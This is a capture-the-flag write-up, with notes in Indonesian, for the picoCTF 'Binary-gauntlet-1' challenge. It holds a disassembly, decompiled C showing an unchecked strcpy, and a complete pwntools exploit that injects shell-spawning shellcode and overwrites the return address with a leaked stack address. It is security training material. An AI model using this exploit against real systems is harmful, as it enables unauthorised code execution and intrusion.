# Binary-gauntlet-1
## Problem
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400687 <+0>:	push   rbp
   0x0000000000400688 <+1>:	mov    rbp,rsp
   0x000000000040068b <+4>:	add    rsp,0xffffffffffffff80
   0x000000000040068f <+8>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000400692 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000400696 <+15>:	mov    edi,0x3e8
   0x000000000040069b <+20>:	call   0x400580 <malloc@plt>
   0x00000000004006a0 <+25>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006a4 <+29>:	lea    rax,[rbp-0x70]
   0x00000000004006a8 <+33>:	mov    rsi,rax
   0x00000000004006ab <+36>:	lea    rdi,[rip+0x122]        # 0x4007d4
   0x00000000004006b2 <+43>:	mov    eax,0x0
   0x00000000004006b7 <+48>:	call   0x400560 <printf@plt>
   0x00000000004006bc <+53>:	mov    rax,QWORD PTR [rip+0x20098d]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x00000000004006c3 <+60>:	mov    rdi,rax
   0x00000000004006c6 <+63>:	call   0x400590 <fflush@plt>
   0x00000000004006cb <+68>:	mov    rdx,QWORD PTR [rip+0x20098e]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x00000000004006d2 <+75>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006d6 <+79>:	mov    esi,0x3e8
   0x00000000004006db <+84>:	mov    rdi,rax
   0x00000000004006de <+87>:	call   0x400570 <fgets@plt>
   0x00000000004006e3 <+92>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006e7 <+96>:	add    rax,0x3e7
   0x00000000004006ed <+102>:	mov    BYTE PTR [rax],0x0
   0x00000000004006f0 <+105>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006f4 <+109>:	mov    rdi,rax
   0x00000000004006f7 <+112>:	mov    eax,0x0
   0x00000000004006fc <+117>:	call   0x400560 <printf@plt>
   0x0000000000400701 <+122>:	mov    rax,QWORD PTR [rip+0x200948]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400708 <+129>:	mov    rdi,rax
   0x000000000040070b <+132>:	call   0x400590 <fflush@plt>
   0x0000000000400710 <+137>:	mov    rdx,QWORD PTR [rip+0x200949]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400717 <+144>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040071b <+148>:	mov    esi,0x3e8
   0x0000000000400720 <+153>:	mov    rdi,rax
   0x0000000000400723 <+156>:	call   0x400570 <fgets@plt>
   0x0000000000400728 <+161>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040072c <+165>:	add    rax,0x3e7
   0x0000000000400732 <+171>:	mov    BYTE PTR [rax],0x0
   0x0000000000400735 <+174>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400739 <+178>:	lea    rax,[rbp-0x70]
   0x000000000040073d <+182>:	mov    rsi,rdx
   0x0000000000400740 <+185>:	mov    rdi,rax
   0x0000000000400743 <+188>:	call   0x400550 <strcpy@plt>
   0x0000000000400748 <+193>:	mov    eax,0x0
   0x000000000040074d <+198>:	leave
=> 0x000000000040074e <+199>:	ret
End of assembler dump.

```

## Diketahui
Hasil dari decompile kurang lebih seperti berikut:
```
undefined8 main(int argc, char **argv)
{
    char **var_88h;
    int var_7ch;
    char *dest;
    char *format;
    
    format = (char *)malloc(1000);
    printf("%p\n", &dest);
    fflush(stdout);
    fgets(format, 1000, stdin);
    format[999] = '\0';
    printf(format);
    fflush(stdout);
    fgets(format, 1000, stdin);
    format[999] = '\0';
    strcpy(&dest, format);
    return 0;
}

```
- Kita bisa eksploit strcpy dengan memasukkan shellcode dan overwrite return address untuk ret di *main+199 dengan alamat yang sudah dileak

## Payload
```
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

#p = process('./gauntlet')
p = remote('wily-courier.picoctf.net', 54467)

# Terima prompt (berisi alamat dalam bentuk string hex)
target_line = p.recvline().strip()  # Dapatkan: b'0x7ffec6241710'
print(f"Received: {target_line}")

# Konversi dari bytes string hex ke integer
target_addr = int(target_line, 16)  # Konversi "0x7ffec6241710" ke integer
print(f"Target address: {hex(target_addr)}")

# Shellcode
shellcode = asm(shellcraft.sh())
print(f"Shellcode length: {len(shellcode)}")

# Input pertama (acak, cukup pendek)
input1 = b'AAAA'
p.sendline(input1)

# Konstruksi payload untuk input kedua
offset = 120
payload = b''
payload += shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(target_addr)  # Return address -> lompat ke buffer stack

# Kirim payload (input kedua)
p.sendline(payload)

# Dapatkan shell
p.interactive()

```